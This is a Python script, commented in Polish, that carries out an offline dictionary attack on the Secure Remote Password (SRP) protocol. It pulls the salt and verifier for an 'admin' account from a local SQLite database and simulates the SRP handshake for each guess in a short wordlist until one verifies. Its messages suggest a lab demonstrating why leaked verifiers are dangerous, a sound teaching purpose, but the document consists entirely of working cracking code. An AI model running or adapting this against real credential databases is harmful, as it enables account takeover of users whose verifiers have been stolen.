import sqlite3
import srp
import binascii
import time

DATABASE = 'database_srp.db'
TARGET_USER = 'admin'  # Użytkownik, którego atakujemy

# Słownik haseł do ataku
WORDLIST = [
    "123456", "password", "qwerty", "admin1", "secret", 
    "iloveyou", "football", "monkey", "dragon", "superhaslo",
    "test", "admin"
]

def get_target_data(username):
    """Pobiera Salt i Verifier ofiary z bazy danych."""
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT salt, verifier FROM users WHERE username = ?", (username,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return binascii.unhexlify(row['salt']), binascii.unhexlify(row['verifier'])
        return None, None
    except Exception as e:
        print(f"Błąd odczytu bazy: {e}")
        return None, None

def verify_guess(username, guess, salt, real_verifier):
    """
    Symuluje proces weryfikacji SRP dla zgadywanego hasła.
    """
    try:
        # 1. Symulacja KLIENTA
        usr = srp.User(username, guess)
        uname, A = usr.start_authentication()

        # 2. Symulacja SERWERA
        svr = srp.Verifier(username, salt, real_verifier, A)
        
        # --- DETEKCJA WERSJI BIBLIOTEKI (CHALLENGE) ---
        if hasattr(svr, 'get_challenge'):
            s, B = svr.get_challenge()
        else:
            s, B = svr.challenge()

        if s is None or B is None:
            return False

        # 3. Klient oblicza dowód M
        M = usr.process_challenge(s, B)

        # 4. Serwer sprawdza dowód
        # --- DETEKCJA WERSJI BIBLIOTEKI (VERIFY) ---
        if hasattr(svr, 'verify_session'):
            HAMK = svr.verify_session(M)
        else:
            HAMK = svr.verify(M)

        return HAMK is not None
        
    except Exception as e:
        # print(f"DEBUG: {e}") # Odkomentuj, jeśli chcesz widzieć błędy
        return False

def brute_force_attack():
    print(f"--- ROZPOCZYNAM ATAK BRUTE-FORCE NA UŻYTKOWNIKA: {TARGET_USER} ---")
    
    salt, real_verifier = get_target_data(TARGET_USER)
    
    if not salt:
        print(f"BŁĄD: Nie znaleziono użytkownika '{TARGET_USER}' w bazie database_srp.db")
        print("Upewnij się, że uruchomiłeś serwer i zarejestrowałeś tego użytkownika!")
        return

    print(f"[+] Znalazłem Salt (hex): {binascii.hexlify(salt).decode()}")
    print(f"[+] Znalazłem Verifier: {binascii.hexlify(real_verifier).decode()[:15]}...")
    print(f"[i] Rozpoczynam sprawdzanie {len(WORDLIST)} haseł ze słownika...")
    
    start_time = time.time()
    attempts = 0

    for guess in WORDLIST:
        attempts += 1
        
        if verify_guess(TARGET_USER, guess, salt, real_verifier):
            end_time = time.time()
            duration = end_time - start_time
            
            print(f"\n[SUCCESS] HASŁO ZŁAMANE!")
            print(f"Hasło to: '{guess}'")
            print(f"Czas ataku: {duration:.4f} sekundy")
            speed = attempts / duration if duration > 0 else attempts
            print(f"Prędkość: {speed:.2f} haseł/sekundę")
            return

    print(f"\n[FAIL] Nie udało się złamać hasła. Spróbuj dodać poprawne hasło do listy WORDLIST.")

if __name__ == '__main__':
    brute_force_attack()